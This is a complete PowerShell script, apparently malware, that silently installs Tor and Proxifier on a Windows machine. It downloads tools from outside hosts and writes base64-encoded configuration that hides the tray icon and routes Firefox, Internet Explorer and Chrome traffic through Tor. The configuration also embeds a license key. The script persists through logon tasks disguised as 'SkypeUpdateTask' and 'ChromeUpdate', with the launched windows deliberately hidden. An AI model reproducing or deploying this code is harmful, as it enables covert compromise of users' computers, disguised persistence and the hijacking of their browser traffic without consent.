function Unzip
{
param([string]$zipfile, [string]$destination);
$7zaExe = Join-Path $env:Temp '7za.exe';
if (-NOT (Test-Path $7zaExe)){
Try
{
(New-Object System.Net.WebClient).DownloadFile('https://chocolatey.org/7za.exe',$7zaExe);
}
Catch{}
}
if ($(Try { Test-Path $7zaExe.trim() } Catch { $false })){
Start-Process "$7zaExe" -ArgumentList "x -o`"$destination`" -y `"$zipfile`"" -Wait -NoNewWindow
}
else{
$shell = new-object -com shell.application;
$zip = $shell.NameSpace($zipfile);
foreach($item in $zip.items())
{
$shell.Namespace($destination).copyhere($item);
}
}
}
function Base64ToFile
{
param([string]$file, [string]$string);
$bytes=[System.Convert]::FromBase64String($string);
#set-content -encoding byte $file -value $bytes;
[IO.File]::WriteAllBytes($file, $bytes);
}
function AddTask
{
param([string]$name, [string]$cmd, [string]$params='');
$ts=New-Object Microsoft.Win32.TaskScheduler.TaskService;
$td=$ts.NewTask();
$td.RegistrationInfo.Description = 'Does something';
$td.Settings.DisallowStartIfOnBatteries = $False;
$td.Settings.StopIfGoingOnBatteries = $False;
$td.Settings.MultipleInstances = [Microsoft.Win32.TaskScheduler.TaskInstancesPolicy]::IgnoreNew;
$LogonTrigger = New-Object Microsoft.Win32.TaskScheduler.LogonTrigger;
$LogonTrigger.StartBoundary=[System.DateTime]::Now;
$LogonTrigger.UserId=$env:username;
$td.Triggers.Add($LogonTrigger);
$ExecAction=New-Object Microsoft.Win32.TaskScheduler.ExecAction($cmd,$params);
$td.Actions.Add($ExecAction);
$task=$ts.RootFolder.RegisterTaskDefinition($name, $td);
$task.Run();
}
function InstallTP{
$File=$env:Temp+'\ts.zip';
$Dest=$env:Temp+'\ts';
(New-Object System.Net.WebClient).DownloadFile('http://download-codeplex.sec.s-msft.com/Download/Release?ProjectName=taskscheduler&DownloadId=1505290&FileTime=131142250937900000&Build=21031',$File);
if ((Test-Path $Dest) -eq 1){rm -Force -Recurse $Dest;}md $Dest | Out-Null;
Unzip $File $Dest;
rm -Force $File;
$TSAssembly=$Dest+'\v2.0\Microsoft.Win32.TaskScheduler.dll';
$loadLib = [System.Reflection.Assembly]::LoadFile($TSAssembly);
$TFile=$env:Temp+'\t.zip';
$DestTP=$env:APPDATA+'\TP';
(New-Object System.Net.WebClient).DownloadFile('https://dist.torproject.org/torbrowser/6.0.2/tor-win32-0.2.7.6.zip',$TFile);
if ((Test-Path $DestTP) -eq 1){rm -Force -Recurse $DestTP;}md $DestTP | Out-Null;
Unzip $TFile $DestTP;
rm -Force $TFile;
$tor=$DestTP+'\Tor\tor.exe';
$tor_cmd="-WindowStyle hidden `"`$t = '[DllImport(\`"user32.dll\`")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member `$t -namespace native;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Start-Process -WindowStyle hidden -FilePath \`"$tor\`";`"";
AddTask 'SkypeUpdateTask' 'PowerShell.exe' $tor_cmd;
$PFile=$env:Temp+'\p1.zip';
$wc=new-object net.webclient;
$purl='http://proxifier.com/distr/ProxifierPE.zip';
$wc.DownloadFile($purl,$PFile);
Unzip $PFile $DestTP;
$p_old=$DestTP+'\Proxifier PE\';
rm -Force $PFile;
Rename-Item -path $p_old -newName 'p';
$p_fold=$DestTP+'\p\';
$p=$DestTP+'\p\Proxifier.exe';
$settings_file=$p_fold+'Settings.ini';
Base64ToFile $settings_file 'W1NldHRpbmdzXQ0KRGVmYXVsdE5ldFByb2ZpbGU9MTcxMTg3Njg4NQ0KTG9nTGV2ZWxTY3JlZW49Mg0KTG9nTGV2ZWxGaWxlPTANCkxvZ1BhdGg9DQpTeXNUcmF5SWNvbj0wDQpTeXNUcmF5SWNvblNob3dUcmFmZmljPTANClNob3dUcmFmZmljVHlwZT0wDQpUcmFmZmljUmVmcmVzaFNwZWVkPTENCkFjdGl2ZVByb2ZpbGU9RGVmYXVsdA0KUHJvZmlsZUF1dG9VcGRhdGU9MA0KUHJvZmlsZVVwZGF0ZVVybD0NClByb2ZpbGVVcGRhdGVVcmxUb0ZvbGRlcj0xDQpQcm9maWxlVXBkYXRlS2VlcExvZ2lucz0wDQpVcGRhdGVDaGVjaz0wDQpbV29ya3NwYWNlXQ0KQXBwbGljYXRpb25Mb29rPTIxNA0KUnVsZURsZ1dpZHRoPTczMg0KUnVsZURsZ0hlaWdodD00MzYNCltEZWZhdWx0XENvbnRyb2xCYXJWZXJzaW9uXQ0KTWFqb3I9OQ0KTWlub3I9MA0KW0RlZmF1bHRcTUZDVG9vbEJhclBhcmFtZXRlcnNdDQpUb29sdGlwcz0xDQpTaG9ydGN1dEtleXM9MQ0KTGFyZ2VJY29ucz0wDQpNZW51QW5pbWF0aW9uPTANClJlY2VudGx5VXNlZE1lbnVzPTENCk1lbnVTaGFkb3dzPTENClNob3dBbGxNZW51c0FmdGVyRGVsYXk9MQ0KQ29tbWFuZHNVc2FnZT1BQUFBQUFBQUFBQUENCltEZWZhdWx0XENvbW1hbmRNYW5hZ2VyXQ0KQ29tbWFuZHNXaXRob3V0SW1hZ2VzPUFBQUENCk1lbnVVc2VySW1hZ2VzPUFBQUENCltEZWZhdWx0XENvbnRyb2xCYXJzLVN1bW1hcnldDQpCYXJzPTANClNjcmVlbkNYPTE5MjANClNjcmVlbkNZPTEwODANCltEZWZhdWx0XFBhbmUtNTkzOTNdDQpJRD0wDQpSZWN0UmVjZW50RmxvYXQ9S0FBQUFBQUFLQUFBQUFBQU9HQUFBQUFBT0dBQUFBQUENClJlY3RSZWNlbnREb2NrZWQ9QUFBQUFBQUFCS0JBQUFBQU1FREFBQUFBRUxCQUFBQUENClJlY2VudEZyYW1lQWxpZ25tZW50PTQwOTYNClJlY2VudFJvd0luZGV4PTANCklzRmxvYXRpbmc9MA0KTVJVV2lkdGg9MzI3NjcNClBpblN0YXRlPTANCltEZWZhdWx0XEJhc2VQYW5lLTU5MzkzXQ0KSXNWaXNpYmxlPTENCltEZWZhdWx0XFBhbmUtLTFdDQpJRD0tMQ0KUmVjdFJlY2VudEZsb2F0PUVQQUFBQUFBQktCQUFBQUFNTEJBQUFBQUpHQ0FBQUFBDQpSZWN0UmVjZW50RG9ja2VkPUFBQUFBQUFBQURBQUFBQUFNRURBQUFBQUtBQkFBQUFBDQpSZWNlbnRGcmFtZUFsaWdubWVudD00MDk2DQpSZWNlbnRSb3dJbmRleD0wDQpJc0Zsb2F0aW5nPTANCk1SVVdpZHRoPTMyNzY3DQpQaW5TdGF0ZT0wDQpbRGVmYXVsdFxCYXNlUGFuZS0tMV0NCklzVmlzaWJsZT0xDQpbRGVmYXVsdFxQYW5lLTMxMF0NCklEPTMxMA0KUmVjdFJlY2VudEZsb2F0PUVQQUFBQUFBQktCQUFBQUFNTEJBQUFBQUpHQ0FBQUFBDQpSZWN0UmVjZW50RG9ja2VkPUVBQUFBQUFBSUVBQUFBQUFJRURBQUFBQUFQQUFBQUFBDQpSZWNlbnRGcmFtZUFsaWdubWVudD04MTkyDQpSZWNlbnRSb3dJbmRleD0wDQpJc0Zsb2F0aW5nPTANCk1SVVdpZHRoPTMyNzY3DQpQaW5TdGF0ZT0wDQpbRGVmYXVsdFxCYXNlUGFuZS0zMTBdDQpJc1Zpc2libGU9MA0KW0RlZmF1bHRcUGFuZS0xMDIyXQ0KSUQ9MTAyMg0KUmVjdFJlY2VudEZsb2F0PUVQQUFBQUFBQktCQUFBQUFNTEJBQUFBQUpHQ0FBQUFBDQpSZWN0UmVjZW50RG9ja2VkPUVBQUFBQUFBSUVBQUFBQUFJRURBQUFBQUFQQUFBQUFBDQpSZWNlbnRGcmFtZUFsaWdubWVudD00MDk2DQpSZWNlbnRSb3dJbmRleD0wDQpJc0Zsb2F0aW5nPTANCk1SVVdpZHRoPTMyNzY3DQpQaW5TdGF0ZT0wDQpbRGVmYXVsdFxCYXNlUGFuZS0xMDIyXQ0KSXNWaXNpYmxlPTANCltEZWZhdWx0XFBhbmUtMTAyM10NCklEPTEwMjMNClJlY3RSZWNlbnRGbG9hdD1FUEFBQUFBQUJLQkFBQUFBTUxCQUFBQUFKR0NBQUFBQQ0KUmVjdFJlY2VudERvY2tlZD1FQUFBQUFBQUlFQUFBQUFBSUVEQUFBQUFBUEFBQUFBQQ0KUmVjZW50RnJhbWVBbGlnbm1lbnQ9NDA5Ng0KUmVjZW50Um93SW5kZXg9MA0KSXNGbG9hdGluZz0wDQpNUlVXaWR0aD0zMjc2Nw0KUGluU3RhdGU9MA0KW0RlZmF1bHRcQmFzZVBhbmUtMTAyM10NCklzVmlzaWJsZT0wDQpbRGVmYXVsdFxEb2NraW5nTWFuYWdlci0xMjhdDQpEb2NraW5nUGFuZUFuZFBhbmVEaXZpZGVycz1BQUFBQUFBQUNBQUFBQUFBQUFBQUFBQUFBQUFDQUFBQUJBQUFBQUFBUFBQUFBQUFBQUFBQUFBQUEFBQUFBQUFBS0FCQUFBQUFNRURBQUFBQU9BQkFBQUFBQUFBQUFBQUFCQUFBQUFBQkVBQUFBQUFBQkFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBUFBQUFBQUFBEQUFBQUFBQUdEQkFBQUFBT1BEQUFBQUFQUERBQUFBQVBQUFBDQUFBTEFBQURFRUZCR0NHQ0dGR0VHQUZCR09HRkdBQUFDQUFBQUJBQUFBQUFBRVBBQUFBQUFCS0JBQUFBQU1MQkFBQUFBSkdDQUFBQUFBQUFBQUFBQUFEQUFBQUFBTUVEQUFBQUFLQUJBQUFBQUFBQUFBQUFBQUVFQkFBR0ZEQUFBQUFBQVBQT1BQUExBREVBQVBHQUFPR0FBT0dBQUZHQUFER0FBRUhBQUpHQUFQR0FBT0dBQURIQUFCQUFBQUFBQUdEQkFBQUFBQkFBQUFBQUFQUFBQUFBQUFBQUFBQUFBQUFBPUFBQSEFFRkFBQ0hBQUJHQUFHR0FBR0dBQUpHQUFER0FBQkFBQUFBQUFPUERBQUFBQUJBQUFBQUFBUFBQUFBQUFBQUFBQUFBQUFBQT1BQUEtBREZBQUVIQUFCR0FBRUhBQUpHQUFESEFBRUhBQUpHQUFER0FBREhBQUJBQUFBQUFBUFBEQUFBQUFCQUFBQUFBQVBQUFBQUFBQUFBQUFBQUFBBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFCQUFBQUFBQVBQUFBQUFBQR0RCQUFBQUFCQUFBQUFBQVBQUFBQUFBQR0RCQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUENCltTdGF0dXNdDQpGaXJzdFJ1bj0wDQpTeXNUcnlJY29uTWVzc2FnZVNob3duPTENCltXb3Jrc3BhY2VcQ29udHJvbEJhclZlcnNpb25dDQpNYWpvcj05DQpNaW5vcj0wDQpbV29ya3NwYWNlXE1GQ1Rvb2xCYXJQYXJhbWV0ZXJzXQ0KVG9vbHRpcHM9MQ0KU2hvcnRjdXRLZXlzPTENCkxhcmdlSWNvbnM9MA0KTWVudUFuaW1hdGlvbj0wDQpSZWNlbnRseVVzZWRNZW51cz0xDQpNZW51U2hhZG93cz0xDQpTaG93QWxsTWVudXNBZnRlckRlbGF5PTENCkNvbW1hbmRzVXNhZ2U9RUZBQUFBQUFFQkFBQUVCT0FBQUFCQUFBQUFBQU1CQUlBQUFBQ0FBQUFBQUFPQkFJQUFBQUdCQUFBQUFBTkJBSUFBQUFBQkFBQUFBQVBEQUlBQUFBTEFBQUFBQUFPREFJQUFBQUJBQUFBQUFBTURBSUFBQUFEQUFBQUFBQU9FQUlBQUFBREFBQUFBQUFLRUFJQUFBQUhBQUFBQUFBTEVBSUFBQUFCQUFBQUFBQU1BRUFBQUFBQkFBQUFBQUFFQUJPQUFBQUJBQUFBQUFBREFCT0FBQUFDQUFBQUFBQVBGQUlBQUFBQ0FBQUFBQUFOQUVBQUFBQUNBQUFBQUFBQUFFQUFBQUFDQUFBQUFBQVBIQUlBQUFBQkFBQUFBQUFPSEFJQUFBQUJBQUFBQUFBQ0NCT0FBQUFDQUFBQUFBQURJQUlBQUFBREFBQUFBQUENCltXb3Jrc3BhY2VcQ29tbWFuZE1hbmFnZXJdDQpDb21tYW5kc1dpdGhvdXRJbWFnZXM9QUFBQQ0KTWVudVVzZXJJbWFnZXM9QUFBQQ0KW1dvcmtzcGFjZVxDb250cm9sQmFycy1TdW1tYXJ5XQ0KQmFycz0wDQpTY3JlZW5DWD0xOTIwDQpTY3JlZW5DWT0xMDgwDQpbV29ya3NwYWNlXFBhbmUtNTkzOTNdDQpJRD0wDQpSZWN0UmVjZW50RmxvYXQ9S0FBQUFBQUFLQUFBQUFBQU9HQUFBQUFBT0dBQUFBQUENClJlY3RSZWNlbnREb2NrZWQ9QUFBQUFBQUFCS0JBQUFBQU1FREFBQUFBRUxCQUFBQUENClJlY2VudEZyYW1lQWxpZ25tZW50PTQwOTYNClJlY2VudFJvd0luZGV4PTANCklzRmxvYXRpbmc9MA0KTVJVV2lkdGg9MzI3NjcNClBpblN0YXRlPTANCltXb3Jrc3BhY2VcQmFzZVBhbmUtNTkzOTNdDQpJc1Zpc2libGU9MQ0KW1dvcmtzcGFjZVxQYW5lLS0xXQ0KSUQ9LTENClJlY3RSZWNlbnRGbG9hdD1FUEFBQUFBQUJOQkFBQUFBQUVFQUFBQUFLTENBQUFBQQ0KUmVjdFJlY2VudERvY2tlZD1BQUFBQUFBQUFEQUFBQUFBTUVEQUFBQUFKQkJBQUFBQQ0KUmVjZW50RnJhbWVBbGlnbm1lbnQ9NDA5Ng0KUmVjZW50Um93SW5kZXg9MA0KSXNGbG9hdGluZz0wDQpNUlVXaWR0aD0zMjc2Nw0KUGluU3RhdGU9MA0KW1dvcmtzcGFjZVxCYXNlUGFuZS0tMV0NCklzVmlzaWJsZT0xDQpbV29ya3NwYWNlXFBhbmUtMzEwXQ0KSUQ9MzEwDQpSZWN0UmVjZW50RmxvYXQ9Q0FCQUFBQUFJQkJBQUFBQUtNQkFBQUFBQU9CQUFBQUENClJlY3RSZWNlbnREb2NrZWQ9RUFBQUFBQUFJRUFBQUFBQUlFREFBQUFBUFBBQUFBQUENClJlY2VudEZyYW1lQWxpZ25tZW50PTgxOTINClJlY2VudFJvd0luZGV4PTANCklzRmxvYXRpbmc9MA0KTVJVV2lkdGg9MzI3NjcNClBpblN0YXRlPTANCltXb3Jrc3BhY2VcQmFzZVBhbmUtMzEwXQ0KSXNWaXNpYmxlPTENCltXb3Jrc3BhY2VcUGFuZS0xMDIyXQ0KSUQ9MTAyMg0KUmVjdFJlY2VudEZsb2F0PUNBQkFBQUFBSUJCQUFBQUFLTUJBQUFBQUFPQkFBQUFBDQpSZWN0UmVjZW50RG9ja2VkPUVBQUFBQUFBSUVBQUFBQUFJRURBQUFBQVBQQUFBQUFBDQpSZWNlbnRGcmFtZUFsaWdubWVudD04MTkyDQpSZWNlbnRSb3dJbmRleD0wDQpJc0Zsb2F0aW5nPTANCk1SVVdpZHRoPTMyNzY3DQpQaW5TdGF0ZT0wDQpbV29ya3NwYWNlXEJhc2VQYW5lLTEwMjJdDQpJc1Zpc2libGU9MQ0KW1dvcmtzcGFjZVxQYW5lLTEwMjNdDQpJRD0xMDIzDQpSZWN0UmVjZW50RmxvYXQ9Q0FCQUFBQUFJQkJBQUFBQUtNQkFBQUFBQU9CQUFBQUENClJlY3RSZWNlbnREb2NrZWQ9RUFBQUFBQUFJRUFBQUFBQUlFREFBQUFBUFBBQUFBQUENClJlY2VudEZyYW1lQWxpZ25tZW50PTgxOTINClJlY2VudFJvd0luZGV4PTANCklzRmxvYXRpbmc9MA0KTVJVV2lkdGg9MzI3NjcNClBpblN0YXRlPTANCltXb3Jrc3BhY2VcQmFzZVBhbmUtMTAyM10NCklzVmlzaWJsZT0xDQpbV29ya3NwYWNlXERvY2tpbmdNYW5hZ2VyLTEyOF0NCkRvY2tpbmdQYW5lQW5kUGFuZURpdmlkZXJzPUFBQUFBQUFBQ0FBQUFBQUFBQUFBQUFBQUFBQUNBQUFBQkFBQUFBQUFQUFBQUFBQUFBQUFBQUFBQQUFBQUFBQUFKQkJBQUFBQU1FREFBQUFBTkJCQUFBQUFCQUFBQUFBQUJBQUFBQUFCRUFBQUFBQUFCQUFBQUFBQUdKT1BQUFBQSUZBQUFBQUFQUFBQUFBQUERBQUFBQUFBR0RCQUFBQUFPUERBQUFBQVBQREFBQUFBUFBQUENBQUFMQUFBREVFRkJHQ0dDR0ZHRUdBRkJHT0dGR0FBQUNBQUFBQkFBQUFBQUFFUEFBQUFBQUJOQkFBQUFBQUVFQUFBQUFLTENBQUFBQUFBQUFBQUFBQURBQUFBQUFNRURBQUFBQUpCQkFBQUFBQUFBQUFBQUFBRUVCQUFHRkRBQUFBQUFBUFBPUFBQTEFERUFBUEdBQU9HQUFPR0FBRkdBQURHQUFFSEFBSkdBQVBHQUFPR0FBREhBQUJBQUFBQUFBR0RCQUFBQUFCQUFBQUFBQVBQUFBQUFBQUFBQUFBQUFBQUE9QUFBIQUVGQUFDSEFBQkdBQUdHQUFHR0FBSkdBQURHQUFCQUFBQUFBQU9QREFBQUFBQkFBQUFBQUFQUFBQUFBQUFBQUFBQUFBQUFBPUFBQS0FERkFBRUhBQUJHQUFFSEFBSkdBQURIQUFFSEFBSkdBQURHQUFESEFBQkFBQUFBQUFQUERBQUFBQUJBQUFBQUFBUFBQUFBQUFBQUFBQUFBQUEFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUJBQUFBQUFBUFBQUFBQUFBHREJBQUFBQUJBQUFBQUFBUFBQUFBQUFBHREJBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQQ0KW1dvcmtzcGFjZVxXaW5kb3dQbGFjZW1lbnRdDQpNYWluV2luZG93UmVjdD1BUEFBQUFBQUtJQkFBQUFBRUVFQUFBQUFKRkRBQUFBQQ0KRmxhZ3M9MA0KU2hvd0NtZD0xDQpbTGljZW5zZV0NCk93bmVyPTJUQ0tYLVRZUUhMLU5GTjMzLTNZRURZLVFXNjVEDQpLZXk9MlRDS1gtVFlRSEwtTkZOMzMtM1lFRFktUVc2NUQNCg==';
$p_prof=$p_fold+'Profiles\';
md $p_prof | Out-Null;
$def_file=$p_prof+'Default.ppx';
Base64ToFile $def_file 'PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9InllcyI/Pg0KPFByb3hpZmllclByb2ZpbGUgdmVyc2lvbj0iMTAxIiBwbGF0Zm9ybT0iV2luZG93cyIgcHJvZHVjdF9pZD0iMSIgcHJvZHVjdF9taW52ZXI9IjMxMCI+DQogIDxPcHRpb25zPg0KICAgIDxSZXNvbHZlPg0KICAgICAgPEF1dG9Nb2RlRGV0ZWN0aW9uIGVuYWJsZWQ9ImZhbHNlIiAvPg0KICAgICAgPFZpYVByb3h5IGVuYWJsZWQ9InRydWUiPg0KICAgICAgICA8VHJ5TG9jYWxEbnNGaXJzdCBlbmFibGVkPSJmYWxzZSIgLz4NCiAgICAgIDwvVmlhUHJveHk+DQogICAgICA8RXhjbHVzaW9uTGlzdD4lQ29tcHV0ZXJOYW1lJTsgbG9jYWxob3N0OyAqLmxvY2FsPC9FeGNsdXNpb25MaXN0Pg0KICAgIDwvUmVzb2x2ZT4NCiAgICA8UHJveGlmaWNhdGlvblBvcnRhYmxlRW5naW5lIHN1YnN5c3RlbT0iMzIiPg0KICAgICAgPExvY2F0aW9uPkJhc2VQcm92aWRlcjwvTG9jYXRpb24+DQogICAgICA8VHlwZSBob3RwYXRjaD0idHJ1ZSI+UHJvbG9ndWU8L1R5cGU+DQogICAgPC9Qcm94aWZpY2F0aW9uUG9ydGFibGVFbmdpbmU+DQogICAgPFByb3hpZmljYXRpb25Qb3J0YWJsZUVuZ2luZSBzdWJzeXN0ZW09IjY0Ij4NCiAgICAgIDxMb2NhdGlvbj5CYXNlUHJvdmlkZXI8L0xvY2F0aW9uPg0KICAgICAgPFR5cGUgaG90cGF0Y2g9ImZhbHNlIj5Qcm9sb2d1ZTwvVHlwZT4NCiAgICA8L1Byb3hpZmljYXRpb25Qb3J0YWJsZUVuZ2luZT4NCiAgICA8RW5jcnlwdGlvbiBtb2RlPSJiYXNpYyIgLz4NCiAgICA8SHR0cFByb3hpZXNTdXBwb3J0IGVuYWJsZWQ9ImZhbHNlIiAvPg0KICAgIDxIYW5kbGVEaXJlY3RDb25uZWN0aW9ucyBlbmFibGVkPSJmYWxzZSIgLz4NCiAgICA8Q29ubmVjdGlvbkxvb3BEZXRlY3Rpb24gZW5hYmxlZD0idHJ1ZSIgLz4NCiAgICA8UHJvY2Vzc1NlcnZpY2VzIGVuYWJsZWQ9ImZhbHNlIiAvPg0KICAgIDxQcm9jZXNzT3RoZXJVc2VycyBlbmFibGVkPSJmYWxzZSIgLz4NCiAgPC9PcHRpb25zPg0KICA8UHJveHlMaXN0Pg0KICAgIDxQcm94eSBpZD0iMTAwIiB0eXBlPSJTT0NLUzUiPg0KICAgICAgPEFkZHJlc3M+MTI3LjAuMC4xPC9BZGRyZXNzPg0KICAgICAgPFBvcnQ+OTA1MDwvUG9ydD4NCiAgICAgIDxPcHRpb25zPjQ4PC9PcHRpb25zPg0KICAgIDwvUHJveHk+DQogIDwvUHJveHlMaXN0Pg0KICA8Q2hhaW5MaXN0IC8+DQogIDxSdWxlTGlzdD4NCiAgICA8UnVsZSBlbmFibGVkPSJ0cnVlIj4NCiAgICAgIDxOYW1lPkxvY2FsaG9zdDwvTmFtZT4NCiAgICAgIDxUYXJnZXRzPmxvY2FsaG9zdDsgMTI3LjAuMC4xOyAlQ29tcHV0ZXJOYW1lJTsgYXBpLmlwaWZ5Lm9yZzwvVGFyZ2V0cz4NCiAgICAgIDxBY3Rpb24gdHlwZT0iRGlyZWN0IiAvPg0KICAgIDwvUnVsZT4NCiAgICA8UnVsZSBlbmFibGVkPSJ0cnVlIj4NCiAgICAgIDxOYW1lPnNvZnQ8L05hbWU+DQogICAgICA8QXBwbGljYXRpb25zPmZpcmVmb3guZXhlO2lleHBsb3JlLmV4ZTtjaHJvbWUuZXhlPC9BcHBsaWNhdGlvbnM+DQogICAgICA8QWN0aW9uIHR5cGU9IlByb3h5Ij4xMDA8L0FjdGlvbj4NCiAgICA8L1J1bGU+DQogICAgPFJ1bGUgZW5hYmxlZD0idHJ1ZSI+DQogICAgICA8TmFtZT5EZWZhdWx0PC9OYW1lPg0KICAgICAgPEFjdGlvbiB0eXBlPSJEaXJlY3QiIC8+DQogICAgPC9SdWxlPg0KICA8L1J1bGVMaXN0Pg0KPC9Qcm94aWZpZXJQcm9maWxlPg==';
$p_cmd="-WindowStyle hidden `"`$t = '[DllImport(\`"user32.dll\`")] public static extern bool ShowWindow(int handle, int state);';add-type -name win -member `$t -namespace native;[native.win]::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0);Start-Process -WindowStyle hidden -FilePath \`"$p\`";while(![native.win]::ShowWindow(([System.Diagnostics.Process]::GetProcessesByName(\`"proxifier\`") | Get-Process).MainWindowHandle, 0)){}`"";
AddTask 'ChromeUpdate' 'PowerShell.exe' $p_cmd;
}
InstallTP
